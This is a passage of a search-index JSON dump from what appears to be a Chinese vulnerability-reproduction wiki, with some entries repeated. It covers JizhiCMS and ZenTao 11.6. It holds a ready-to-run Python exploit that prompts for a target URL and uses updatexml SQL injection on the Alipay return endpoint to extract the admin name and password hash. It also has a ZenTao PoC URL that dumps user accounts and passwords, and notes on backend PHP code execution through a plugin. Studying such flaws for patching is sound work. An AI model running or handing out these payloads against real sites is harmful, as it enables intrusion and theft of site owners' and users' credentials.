1.8\u4ee5\u4e0b\u5168\u7248\u672c (\u5f53\u524d\u6700\u65b0 v1.8 \u66f4\u65b0\u65f6\u95f4:6\u670830\u65e5) \"\"\" function orderdetails(){ $orderno = $this->frparam('orderno',1); $order = M('orders')->find(['orderno'=>$orderno]); if($orderno && $order){ /* if($order['isshow']!=1){ //\u8d85\u65f6\u6216\u8005\u5df2\u652f\u4ed8 if($order['isshow']==0){ $msg = '\u8ba2\u5355\u5df2\u5220\u9664'; } if($order['isshow']==3){ $msg = '\u8ba2\u5355\u5df2\u8fc7\u671f\uff0c\u4e0d\u53ef\u652f\u4ed8\uff01'; } if($order['isshow']==2){ $msg = '\u8ba2\u5355\u5df2\u652f\u4ed8\uff0c\u8bf7\u52ff\u91cd\u590d\u64cd\u4f5c\uff01'; } if($this->frparam('ajax')){ JsonReturn(['code'=>1,'msg'=>$msg]); } Error($msg); } */ $carts = explode('||',$order['body']); $new = []; foreach($carts as $k=>$v){ $d = explode('-',$v); if($d[0]!=''){ //\u517c\u5bb9\u591a\u6a21\u5757\u5316 if(isset($this->classtypedata[$d[0]])){ $type = $this->classtypedata[$d[0]]; $res = M($type['molds'])->find(['id'=>$d[1]]); $new[] = ['info'=>$res,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; }else{ $new[] = ['info'=>false,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; } } } $this->carts = $new; $this->order = $order; $this->display($this->template.'/user/orderdetails'); } } \"\"\" try : exploit_url = str ( input ( \"\u653b\u51fb\u7f51\u7ad9url\uff1a \\n \" )) year_day = str ( input ( \"\u8f93\u5165\u65e5\u671f(\u4f8b\u5982:20200712):\" )) shop = [] # \u904d\u5386\u6240\u6709\u51fa\u73b0\u7684\u7528\u6237\u8d2d\u7269\u8f66\u9875\u9762 for num in range ( 100000 , 999999 ): #payload_url = \"user/orderdetails/orderno/No\" + year_day + str(num) + \".html\" payload_url = \"user/orderdetails/orderno/No20200712213927.html\" response = requests . get ( exploit_url + payload_url ) # \u6253\u5370\u7ed3\u679c if '\u603b\u91d1\u989d' in response . text : print ( '\u8d2d\u7269\u8f66\u9875\u9762\uff1a' , payload_url ) shop . append ( payload_url ) for page in shop : print ( page ) print ( '------------------ peiqi -----------------------' ) except : print ( '\u51fa\u73b0\u9519\u8bef' ) print ( '------------------ peiqi -----------------------' ) def poc_3 (): ## poc_3 ---> \u5f97\u5230\u8d26\u53f7\u5bc6\u7801 ( Home/c/MypayController.php [alipay_notify_pay]) ## \u4f7f\u7528\u8303\u56f4 ---> \u6781\u81f4cms 1.71 + 1.7 + 1.67 \u7248\u672c try : exploit_url = str ( input ( \"\u653b\u51fb\u7f51\u7ad9url\uff1a \\n \" )) # payload --> updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+ # \u7528\u6237\u540d + \u5bc6\u7801 \u957f\u5ea6 payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+\" response = requests . get ( payload_url ) str_long = re . search ( r '~(.*?)~' , response . text ) . group ( 1 ) #print(str_long) # \u5f97\u5230\u8d26\u53f7\u5bc6\u7801\uff0c\u5bc6\u7801md5\u683c\u5f0f payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),1,32) from jz_level limit 0,1),0x7e),1)--+\" response = requests . get ( payload_url ) admin_name_1 = re . search ( r \"~#(.*?)'\" , response . text ) . group ( 1 ) #print(admin_name_1) payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),32,\" + str ( int ( str_long ) - 32 ) + \") from jz_level limit 0,1),0x7e),1)--+\" response = requests . get ( payload_url ) admin_name_2 = re . search ( r '~(.*?)~' , response . text ) . group ( 1 ) #print(admin_name_2) # \u5206\u5272\u8d26\u53f7\u5bc6\u7801 admin_passwd = admin_name_1 + admin_name_2 admin_passwd = admin_passwd . split ( ':' ) admin = admin_passwd [ 0 ] passwd = admin_passwd [ 1 ] #print(admin) #print(passwd) print ( \"\u6210\u529f\u5f97\u5230\u8d26\u53f7\u5bc6\u7801\uff1a \\n \" \"\u7528\u6237\u540d:\" , admin , \" \\n \u5bc6\u7801(md5):\" , passwd ) print ( '------------------ peiqi -----------------------' ) except : print ( '\u51fa\u73b0\u9519\u8bef' ) print ( '------------------ peiqi -----------------------' ) if __name__ == '__main__' : main () \u8d2d\u7269\u8f66\u7206\u7834\u6ca1\u6709\u5229\u7528\u70b9\uff0c\u5173\u4e8e\u5ba1\u8ba1\u90e8\u5206\u53c2\u8003 \u6781\u81f4CMS\u5ba1\u8ba1","title":"\u6781\u81f4CMS_1.71_1.7_1.67\u7248\u672csql\u6ce8\u5165(\u652f\u4ed8\u63d2\u4ef6)"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E6%9E%81%E8%87%B4CMS/%E6%9E%81%E8%87%B4CMS_%E5%85%A8%E7%89%88%E6%9C%AC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","text":"\u6781\u81f4CMS_\u5168\u7248\u672c\u4efb\u610f\u6587\u4ef6(\u540e\u53f0) \u00b6 \u767b\u9646\u540e\u53f0\u67e5\u770b\u63d2\u4ef6\u5904\uff0c\u6709\u4e00\u4e2a\u540e\u53f0\u7f16\u8f91\u7684\u63d2\u4ef6 \u5b89\u88c5\u4e4b\u540e\u8bbe\u7f6e\u5bc6\u7801\u5e76\u4f7f\u7528 [!NOTE] \u5982\u679c\u5df2\u7ecf\u8bbe\u6709\u5bc6\u7801\uff0c\u91cd\u65b0\u5b89\u88c5\u63d2\u4ef6\u5373\u53ef\u89e3\u51b3\u5bc6\u7801\u672a\u77e5\u95ee\u9898 \u4fee\u6539\u4e3aphp\u4ee3\u7801 \u6210\u529f\u6267\u884cphp\u4ee3\u7801\u7684\u547d\u4ee4","title":"\u6781\u81f4CMS_\u5168\u7248\u672c\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E6%9E%81%E8%87%B4CMS/%E6%9E%81%E8%87%B4CMS_%E5%85%A8%E7%89%88%E6%9C%AC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6781\u81f4cms_\u5168\u7248\u672c\u4efb\u610f\u6587\u4ef6\u540e\u53f0","text":"\u767b\u9646\u540e\u53f0\u67e5\u770b\u63d2\u4ef6\u5904\uff0c\u6709\u4e00\u4e2a\u540e\u53f0\u7f16\u8f91\u7684\u63d2\u4ef6 \u5b89\u88c5\u4e4b\u540e\u8bbe\u7f6e\u5bc6\u7801\u5e76\u4f7f\u7528 [!NOTE] \u5982\u679c\u5df2\u7ecf\u8bbe\u6709\u5bc6\u7801\uff0c\u91cd\u65b0\u5b89\u88c5\u63d2\u4ef6\u5373\u53ef\u89e3\u51b3\u5bc6\u7801\u672a\u77e5\u95ee\u9898 \u4fee\u6539\u4e3aphp\u4ee3\u7801 \u6210\u529f\u6267\u884cphp\u4ee3\u7801\u7684\u547d\u4ee4","title":"\u6781\u81f4CMS_\u5168\u7248\u672c\u4efb\u610f\u6587\u4ef6(\u540e\u53f0)"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u7985\u9053 11.6\u7248\u672c SQL\u6ce8\u5165\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u7985\u9053 11.6 \u7248\u672c\u4e2d\u5bf9\u7528\u6237\u63a5\u53e3\u8c03\u7528\u6743\u9650\u8fc7\u6ee4\u4e0d\u5b8c\u5584\uff0c\u5bfc\u81f4\u8c03\u7528\u63a5\u53e3\u6267\u884cSQL\u8bed\u53e5\u5bfc\u81f4SQL\u6ce8\u5165 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] \u7985\u9053 11.6 \u73af\u5883\u642d\u5efa \u00b6 \u8fd9\u91cc\u4f7f\u7528docker\u73af\u5883\u642d\u5efa docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8084 \u6309\u6b65\u9aa4\u5b89\u88c5\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5148\u5bf9\u7985\u9053\u7684\u8c03\u7528\u6d41\u7a0b\u8fdb\u884c\u5206\u6790,\u5148\u67e5\u770b\u76ee\u5f55\u4e3a**www/index.php**\u9996\u9875\u6587\u4ef6\u4e2d \u8fd9\u91cc\u4f7f\u7528**router::createApp**\u521b\u5efa\u4e86\u4e00\u4e2aAPP\u5bf9\u8c61 $app = router::createApp('pms', dirname(dirname(__FILE__)), 'router'); \u6765\u5230**framework/base/router.class.php**\u6587\u4ef6\u67e5\u770b\u5230**createApp**\u65b9\u6cd5 public static function createApp($appName = 'demo', $appRoot = '', $className = '') { if(empty($className)) $className = __CLASS__; return new $className($appName, $appRoot); } \u8fd9\u91ccNew\u4e86\u4e00\u4e2a\u5bf9\u8c61\uff0c\u67e5\u770b\u4e00\u4e0b\u8c03\u7528\u65b9\u6cd5(348\u884c) \u5728358\u884c\u5904\u8c03\u7528\u4e86**setConfigRoot**\u65b9\u6cd5 $this->setConfigRoot(); public function setConfigRoot() { $this->configRoot = $this->basePath . 'config' . DS; } \u5728363\u884c\u5904\u8c03\u7528\u4e86**loadMainConfig**\u65b9\u6cd5 $this->loadMainConfig(); public function loadMainConfig() { /* \u521d\u59cb\u5316$config\u5bf9\u8c61\u3002Init the $config object. */ global $config, $filter; if(!is_object($config)) $config = new config(); $this->config = $config; /* \u52a0\u8f7d\u4e3b\u914d\u7f6e\u6587\u4ef6\u3002 Load the main config file. */ $mainConfigFile = $this->configRoot . 'config.php'; if(!file_exists($mainConfigFile)) $this->triggerError(\"The main config file $mainConfigFile not found\", __FILE__, __LINE__, $exit = true); include $mainConfigFile; } \u8fd9\u91cc\u5305\u542b\u4e86\u914d\u7f6e\u6587\u4ef6**config.php**\u914d\u7f6e\u6587\u4ef6\uff0c\u6587\u4ef6\u76ee\u5f55\u4e3a**/config/config.php** \u572825\u884c\u5b9a\u4e49\u4e86\u8c03\u7528\u65b9\u6cd5 $config->requestType = 'PATH_INFO'; // \u8bf7\u6c42\u7c7b\u578b\uff1aPATH_INFO|PATHINFO2|GET\u3002 The request type: PATH_INFO|PATH_INFO2|GET. $config->requestFix = '-'; // PATH_INFO\u548cPATH_INFO2\u6a21\u5f0f\u7684\u5206\u9694\u7b26\u3002 The divider in the url when PATH_INFO|PATH_INFO2. $config->moduleVar = 'm'; // \u8bf7\u6c42\u7c7b\u578b\u4e3aGET\uff1a\u6a21\u5757\u53d8\u91cf\u540d\u3002 requestType=GET: the module var name. $config->methodVar = 'f'; // \u8bf7\u6c42\u7c7b\u578b\u4e3aGET\uff1a\u6a21\u5757\u53d8\u91cf\u540d\u3002 requestType=GET: the method var name. $config->viewVar = 't'; // \u8bf7\u6c42\u7c7b\u578b\u4e3aGET\uff1a\u89c6\u56fe\u53d8\u91cf\u540d\u3002 requestType=GET: the view var name. $config->sessionVar = 'zentaosid'; // \u8bf7\u6c42\u7c7b\u578b\u4e3aGET\uff1asession\u53d8\u91cf\u540d\u3002 requestType=GET: the session var name. $config->views = ',html,json,mhtml,xhtml,'; // \u652f\u6301\u7684\u89c6\u56fe\u7c7b\u578b\u3002 Supported view formats. \u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u5b58\u5728\u4e24\u79cd\u8def\u7531**PATH_INFO|PATH_INFO2**\uff1a\u4e00\u79cd\u662fm\u3001f\u3001t\u6765\u8fdb\u884c\u8c03\u7528\u3002\u53e6\u5916\u4e00\u79cd\u662f\u901a\u8fc7-\u6765\u8fdb\u884c\u8c03\u7528 \u5728**index.php**\u4e2d\u7684**66\u884c** $app->parseRequest(); public function parseRequest() { if($this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2') { $this->parsePathInfo(); $this->setRouteByPathInfo(); } elseif($this->config->requestType == 'GET') { $this->parseGET(); $this->setRouteByGET(); } else { $this->triggerError(\"The request type {$this->config->requestType} not supported\", __FILE__, __LINE__, $exit = true); } } \u770b\u5230\u8fd9\u4e00\u6761\u5219\u662f\u5224\u65ad\u529b\u4e24\u79cd\u8c03\u7528\u65b9\u6cd5 $this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2' \u8ddf\u8fdb**setRouteByPathInfo\u65b9\u6cd5** public function setRouteByPathInfo() { if(!empty($this->URI)) { /* * \u6839\u636e$requestFix\u5206\u5272\u7b26\uff0c\u5206\u5272\u7f51\u5740\u3002 * There's the request seperator, split the URI by it. **/ if(strpos($this->URI, $this->config->requestFix) !== false) { $items = explode($this->config->requestFix, $this->URI); $this->setModuleName($items[0]); $this->setMethodName($items[1]); } /* * \u5982\u679c\u7f51\u5740\u4e2d\u6ca1\u6709\u5206\u9694\u7b26\uff0c\u4f7f\u7528\u9ed8\u8ba4\u7684\u65b9\u6cd5\u3002 * No reqeust seperator, use the default method name. **/ else { $this->setModuleName($this->URI); $this->setMethodName($this->config->default->method); } } else { $this->setModuleName($this->config->default->module); // \u4f7f\u7528\u9ed8\u8ba4\u6a21\u5757 use the default module. $this->setMethodName($this->config->default->method); // \u4f7f\u7528\u9ed8\u8ba4\u65b9\u6cd5 use the default method. } $this->setControlFile(); } \u6240\u4ee5\u53ef\u4ee5\u63a8\u65ad\u51fa\u8c03\u7528\u7684\u65b9\u6cd5 \u4f8b\u5982**\u767b\u5f55\u9875\u9762**\u6709\u4e24\u79cd\u8bbf\u95ee\u65b9\u6cd5 http://xxx.xxx.xxx.xxx/index.php?m=user&f=login http://xxx.xxx.xxx.xxx/user-login.html \u518d\u770b\u4e00\u4e0b**checkPriv\u65b9\u6cd5** public function checkPriv() { $module = $this->app->getModuleName(); $method = $this->app->getMethodName(); if(!empty($this->app->user->modifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this->isOpenMethod($module, $method)) return true; if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth(); if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie(); if(isset($this->app->user)) { if(!commonModel::hasPriv($module, $method)) $this->deny($module, $method); } else { $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } \u8fd9\u91cc\u68c0\u6d4b\u4e86\u8c03\u7528\u6a21\u5757\u548c\u65b9\u6cd5\u7684\u6743\u9650\uff0c\u53ef\u4ee5\u77e5\u9053\u9664\u4e86**isOpenMethod**\u4e2d\u5b9a\u4e49\u7684\u516c\u5f00\u6a21\u5757\u548c\u65b9\u6cd5\u4e4b\u5916\uff0c\u5176\u4ed6\u7684\u65b9\u6cd5\u90fd\u662f\u9700\u8981\u767b\u5f55\u7684 \u6700\u540e\u662f**$app->loadModule();**\u8fd9\u6bb5\u4ee3\u7801 public function loadModule() { $appName = $this->appName; $moduleName = $this->moduleName; $methodName = $this->methodName; /* * \u5f15\u5165\u8be5\u6a21\u5757\u7684control\u6587\u4ef6\u3002 * Include the control file of the module. **/ $file2Included = $this->setActionExtFile() ? $this->extActionFile : $this->controlFile; chdir(dirname($file2Included)); helper::import($file2Included); /* * \u8bbe\u7f6econtrol\u7684\u7c7b\u540d\u3002 * Set the class name of the control. **/ $className = class_exists(\"my$moduleName\") ? \"my$moduleName\" : $moduleName; if(!class_exists($className)) $this->triggerError(\"the control $className not found\", __FILE__, __LINE__, $exit = true); /* * \u521b\u5efacontrol\u7c7b\u7684\u5b9e\u4f8b\u3002 * Create a instance of the control. **/ $module = new $className(); if(!method_exists($module, $methodName)) $this->triggerError(\"the module $moduleName has no $methodName method\", __FILE__, __LINE__, $exit = true); $this->control = $module; /* include default value for module*/ $defaultValueFiles = glob($this->getTmpRoot() . \"defaultvalue/*.php\"); if($defaultValueFiles) foreach($defaultValueFiles as $file) include $file; /* * \u4f7f\u7528\u53cd\u5c04\u673a\u5236\u83b7\u53d6\u51fd\u6570\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\u3002 * Get the default settings of the method to be called using the reflecting. * * */ $defaultParams = array(); $methodReflect = new reflectionMethod($className, $methodName); foreach($methodReflect->getParameters() as $param) { $name = $param->getName(); $default = '_NOT_SET'; if(isset($paramDefaultValue[$appName][$className][$methodName][$name])) { $default = $paramDefaultValue[$appName][$className][$methodName][$name]; } elseif(isset($paramDefaultValue[$className][$methodName][$name])) { $default = $paramDefaultValue[$className][$methodName][$name]; } elseif($param->isDefaultValueAvailable()) { $default = $param->getDefaultValue(); } $defaultParams[$name] = $default; } /** * \u6839\u636ePATH_INFO\u6216\u8005GET\u65b9\u5f0f\u8bbe\u7f6e\u8bf7\u6c42\u7684\u53c2\u6570\u3002 * Set params according PATH_INFO or GET. */ if($this->config->requestType != 'GET') { $this->setParamsByPathInfo($defaultParams); } else { $this->setParamsByGET($defaultParams); } if($this->config->framework->filterParam == 2) { $_GET = validater::filterParam($_GET, 'get'); $_COOKIE = validater::filterParam($_COOKIE, 'cookie'); } /* \u8c03\u7528\u8be5\u65b9\u6cd5 Call the method. */ call_user_func_array(array($module, $methodName), $this->params); return $module; } \u901a\u8fc7\u4e4b\u524d\u83b7\u53d6\u7684**moduleName**\u5305\u542b\u5bf9\u5e94\u7684**control\u7c7b**\u6587\u4ef6\u5e76\u5b9e\u4f8b\u5316\uff0c\u968f\u540e\u8c03\u7528**setParamsByPathInfo**\u65b9\u6cd5\u4ece\u8def\u5f84\u4e2d\u83b7\u53d6\u65b9\u6cd5\u5bf9\u5e94\u7684\u53c2\u6570\u503c\uff0c\u6700\u540e\u901a\u8fc7**call_user_func_array**\u65b9\u6cd5\u8c03\u7528\u5bf9\u5e94**control\u7c7b**\u4e2d\u7684\u5bf9\u5e94\u65b9\u6cd5\u5e76\u8d4b\u503c\u3002 \u6211\u4eec\u67e5\u770b**module/api/control.php**\u6587\u4ef6\u4e2d\u7684**getModel**\u65b9\u6cd5 \u8fd9\u91cc\u901a\u8fc7**call_user_func_array**\u51fd\u6570\u8c03\u7528\u6240\u6709\u7684**model\u6587\u4ef6**\u7684\u6240\u6709\u65b9\u6cd5\u3002 $result = call_user_func_array(array(&$module, $methodName), $params); \u53ef\u4ee5\u770b\u5230**module/api/moudel.php**\u4e2d\u7684**sql\u51fd\u6570** public function sql($sql, $keyField = '') { $sql = trim($sql); if(strpos($sql, ';') !== false) $sql = substr($sql, 0, strpos($sql, ';')); a($sql); if(empty($sql)) return ''; if(stripos($sql, 'select ') !== 0) { return $this->lang->api->error->onlySelect; } else { try { $stmt = $this->dao->query($sql); if(empty($keyField)) return $stmt->fetchAll(); $rows = array(); while($row = $stmt->fetch()) $rows[$row->$keyField] = $row; return $rows; } catch(PDOException $e) { return $e->getMessage(); } } } \u8fd9\u91cc\u5e76\u6ca1\u6709\u8fdb\u884c\u8fc7\u6ee4\uff0c\u53ea\u4f7f\u7528\u4e86\u4ee3\u7801** sql=trim( sql=trim( sql)**\u8fc7\u6ee4\u4e86\u7a7a\u683c \u6211\u4eec\u770b\u4e00\u4e0b\u8fd9\u91cc\u7684\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u9700\u8981\u7684\u6743\u9650 \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u4efb\u4f55\u7528\u6237\u90fd\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u6a21\u5757\u7684\u65b9\u6cd5\uff0c\u6240\u4ee5\u6211\u4eec\u7528\u5b83\u8c03\u7528**sql**\u65b9\u6cd5\u8fdb\u884c\u67e5\u8be2(\u7a7a\u683c\u8f6c\u6362\u4e3a+,\u7ed5\u8fc7\u8fc7\u6ee4) http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user \u6210\u529f\u6267\u884csql\u8bed\u53e5 \u6f0f\u6d1e\u5229\u7528POC \u00b6 \u767b\u9646\u540e\u8bbf\u95ee http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user","title":"\u7985\u9053 11.6\u7248\u672c SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u7985\u9053-116\u7248\u672c-sql\u6ce8\u5165\u6f0f\u6d1e","text":"","title":"\u7985\u9053 11.6\u7248\u672c SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u7985\u9053 11.6 \u7248\u672c\u4e2d\u5bf9\u7528\u6237\u63a5\u53e3\u8c03\u7528\u6743\u9650\u8fc7\u6ee4\u4e0d\u5b8c\u5584\uff0c\u5bfc\u81f4\u8c03\u7528\u63a5\u53e3\u6267\u884cSQL\u8bed\u53e5\u5bfc\u81f4SQL\u6ce8\u5165","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] \u7985\u9053 11.6","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"\u8fd9\u91cc\u4f7f\u7528docker\u73af\u5883\u642d\u5efa docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8084 \u6309\u6b65\u9aa4\u5b89\u88c5\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5148\u5bf9\u7985\u9053\u7684\u8c03\u7528\u6d41\u7a0b\u8fdb\u884c\u5206\u6790,\u5148\u67e5\u770b\u76ee\u5f55\u4e3a**www/index.php**\u9996\u9875\u6587\u4ef6\u4e2d \u8fd9\u91cc\u4f7f\u7528**router::createApp**\u521b\u5efa\u4e86\u4e00\u4e2aAPP\u5bf9\u8c61 $app = router::createApp('pms', dirname(dirname(__FILE__)), 'router'); \u6765\u5230**framework/base/router.class.php**\u6587\u4ef6\u67e5\u770b\u5230**createApp**\u65b9\u6cd5 public static function createApp($appName = 'demo', $appRoot = '', $className = '') { if(empty($className)) $className = __CLASS__; return new $className($appName, $appRoot); } \u8fd9\u91ccNew\u4e86\u4e00\u4e2a\u5bf9\u8c61\uff0c\u67e5\u770b\u4e00\u4e0b\u8c03\u7528\u65b9\u6cd5(348\u884c) \u5728358\u884c\u5904\u8c03\u7528\u4e86**setConfigRoot**\u65b9\u6cd5 $this->setConfigRoot(); public function setConfigRoot() { $this->configRoot = $this->basePath . 'config' . DS; } \u5728363\u884c\u5904\u8c03\u7528\u4e86**loadMainConfig**\u65b9\u6cd5 $this->loadMainConfig(); public function loadMainConfig() { /* \u521d\u59cb\u5316$config\u5bf9\u8c61\u3002Init the $config object. */ global $config, $filter; if(!is_object($config)) $config = new config(); $this->config = $config; /* \u52a0\u8f7d\u4e3b\u914d\u7f6e\u6587\u4ef6\u3002 Load the main config file. */ $mainConfigFile = $this->configRoot . 'config.php'; if(!file_exists($mainConfigFile)) $this->triggerError(\"The main config file $mainConfigFile not found\", __FILE__, __LINE__, $exit = true); include $mainConfigFile; } \u8fd9\u91cc\u5305\u542b\u4e86\u914d\u7f6e\u6587\u4ef6**config.php**\u914d\u7f6e\u6587\u4ef6\uff0c\u6587\u4ef6\u76ee\u5f55\u4e3a**/config/config.php** \u572825\u884c\u5b9a\u4e49\u4e86\u8c03\u7528\u65b9\u6cd5 $config->requestType = 'PATH_INFO'; // \u8bf7\u6c42\u7c7b\u578b\uff1aPATH_INFO|PATHINFO2|GET\u3002 The request type: PATH_INFO|PATH_INFO2|GET. $config->requestFix = '-'; // PATH_INFO\u548cPATH_INFO2\u6a21\u5f0f\u7684\u5206\u9694\u7b26\u3002 The divider in the url when PATH_INFO|PATH_INFO2. $config->moduleVar = 'm'; // \u8bf7\u6c42\u7c7b\u578b\u4e3aGET\uff1a\u6a21\u5757\u53d8\u91cf\u540d\u3002 requestType=GET: the module var name. $config->methodVar = 'f'; // \u8bf7\u6c42\u7c7b\u578b\u4e3aGET\uff1a\u6a21\u5757\u53d8\u91cf\u540d\u3002 requestType=GET: the method var name. $config->viewVar = 't'; // \u8bf7\u6c42\u7c7b\u578b\u4e3aGET\uff1a\u89c6\u56fe\u53d8\u91cf\u540d\u3002 requestType=GET: the view var name. $config->sessionVar = 'zentaosid'; // \u8bf7\u6c42\u7c7b\u578b\u4e3aGET\uff1asession\u53d8\u91cf\u540d\u3002 requestType=GET: the session var name. $config->views = ',html,json,mhtml,xhtml,'; // \u652f\u6301\u7684\u89c6\u56fe\u7c7b\u578b\u3002 Supported view formats. \u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u5b58\u5728\u4e24\u79cd\u8def\u7531**PATH_INFO|PATH_INFO2**\uff1a\u4e00\u79cd\u662fm\u3001f\u3001t\u6765\u8fdb\u884c\u8c03\u7528\u3002\u53e6\u5916\u4e00\u79cd\u662f\u901a\u8fc7-\u6765\u8fdb\u884c\u8c03\u7528 \u5728**index.php**\u4e2d\u7684**66\u884c** $app->parseRequest(); public function parseRequest() { if($this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2') { $this->parsePathInfo(); $this->setRouteByPathInfo(); } elseif($this->config->requestType == 'GET') { $this->parseGET(); $this->setRouteByGET(); } else { $this->triggerError(\"The request type {$this->config->requestType} not supported\", __FILE__, __LINE__, $exit = true); } } \u770b\u5230\u8fd9\u4e00\u6761\u5219\u662f\u5224\u65ad\u529b\u4e24\u79cd\u8c03\u7528\u65b9\u6cd5 $this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2' \u8ddf\u8fdb**setRouteByPathInfo\u65b9\u6cd5** public function setRouteByPathInfo() { if(!empty($this->URI)) { /* * \u6839\u636e$requestFix\u5206\u5272\u7b26\uff0c\u5206\u5272\u7f51\u5740\u3002 * There's the request seperator, split the URI by it. **/ if(strpos($this->URI, $this->config->requestFix) !== false) { $items = explode($this->config->requestFix, $this->URI); $this->setModuleName($items[0]); $this->setMethodName($items[1]); } /* * \u5982\u679c\u7f51\u5740\u4e2d\u6ca1\u6709\u5206\u9694\u7b26\uff0c\u4f7f\u7528\u9ed8\u8ba4\u7684\u65b9\u6cd5\u3002 * No reqeust seperator, use the default method name. **/ else { $this->setModuleName($this->URI); $this->setMethodName($this->config->default->method); } } else { $this->setModuleName($this->config->default->module); // \u4f7f\u7528\u9ed8\u8ba4\u6a21\u5757 use the default module. $this->setMethodName($this->config->default->method); // \u4f7f\u7528\u9ed8\u8ba4\u65b9\u6cd5 use the default method. } $this->setControlFile(); } \u6240\u4ee5\u53ef\u4ee5\u63a8\u65ad\u51fa\u8c03\u7528\u7684\u65b9\u6cd5 \u4f8b\u5982**\u767b\u5f55\u9875\u9762**\u6709\u4e24\u79cd\u8bbf\u95ee\u65b9\u6cd5 http://xxx.xxx.xxx.xxx/index.php?m=user&f=login http://xxx.xxx.xxx.xxx/user-login.html \u518d\u770b\u4e00\u4e0b**checkPriv\u65b9\u6cd5** public function checkPriv() { $module = $this->app->getModuleName(); $method = $this->app->getMethodName(); 